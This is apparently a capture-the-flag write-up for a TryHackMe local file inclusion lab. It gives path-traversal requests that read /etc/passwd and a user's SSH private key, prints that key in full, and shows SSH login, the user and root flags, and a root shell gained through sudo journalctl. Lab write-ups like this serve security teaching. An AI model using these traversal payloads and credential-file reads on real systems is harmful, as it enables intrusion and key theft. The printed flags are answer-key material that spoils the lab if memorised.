I"v<p>It’s a write-up about the room : [Try Hack Me - Room : LFI]</p>

<h1 id="task-2---getting-user-access-via-lfi">[Task 2] - Getting user access via LFI</h1>

<ul>
  <li>
    <p>Look around the website. What is the name of the parameter you found on the website? 
Navigating the page, after click the “Leave a Review” button yeilded a field in the address bar <code class="language-plaintext highlighter-rouge">/home?page=about</code>. So, the name of the parameter is <code class="language-plaintext highlighter-rouge">page</code>.</p>
  </li>
  <li>
    <p>What is the name of the user on the system?</p>
  </li>
</ul>

<p>We entered : <code class="language-plaintext highlighter-rouge">http://10.10.147.195/home?page=../../../../etc/passwd</code> and found the user <strong>falcon</strong>.<br />
<code class="language-plaintext highlighter-rouge">falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</code></p>

<ul>
  <li>Name of the file which can give you access to falcon’s account on the system? <strong>id_rsa</strong>.</li>
</ul>

<p>In Burp Suite, in the repeater :<br />
<code class="language-plaintext highlighter-rouge">GET /home?page=../../../../home/falcon/.ssh/id_rsa HTTP/1.1</code>.</p>

<p>We found the RSA private key :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi
ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT
ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS
lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22
e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD
Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB
j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw
GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ
2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D
w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9
VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM
PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+
ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i
IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc
ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/

1MlTXEpFdC+
VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A
1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF
2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP
jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw
2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP
vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB
kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8
poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V
E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH
ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg==
-----END RSA PRIVATE KEY-----
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We copied that in a <em>falcon_rsa</em> file and changed privileges of the file <code class="language-plaintext highlighter-rouge">chmod 600 falcon_rsa</code>.<br />
After that, in the terminal we used ssh to connect : <code class="language-plaintext highlighter-rouge">ssh -i falcon_rsa falcon@ip_machine</code>.</p>

<p>We used <code class="language-plaintext highlighter-rouge">ls</code>to see the differents files in the directory. We found <code class="language-plaintext highlighter-rouge">user.txt</code>.<br />
Therefore, we read this one <code class="language-plaintext highlighter-rouge">cat user.txt</code>. We found the flag <strong>B8LEGIF049JT4RTVWUG4</strong>.</p>

<h1 id="task-3---escalating-your-privileges-to-root">[Task 3] - Escalating your privileges to root</h1>

<ul>
  <li>What can falcon run as root?</li>
</ul>

<p>We used <code class="language-plaintext highlighter-rouge">sudo -l</code> to know how to run as root and the output was :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So we used : <code class="language-plaintext highlighter-rouge">ls -l /bin/journaltcl</code></p>

<ul>
  <li>What is the root flag?</li>
</ul>

<p>With gtfobins, we found that : <code class="language-plaintext highlighter-rouge">!/bin/sh</code> enabled to used shell as root.<br />
Therefore we searched the root directory : <code class="language-plaintext highlighter-rouge">find /root</code>. We found <code class="language-plaintext highlighter-rouge">root/root.txt</code> and used the command <code class="language-plaintext highlighter-rouge">cat</code>to see the flag : <strong>H1EQRK5XEX140H2KMO08</strong>.</p>
:ET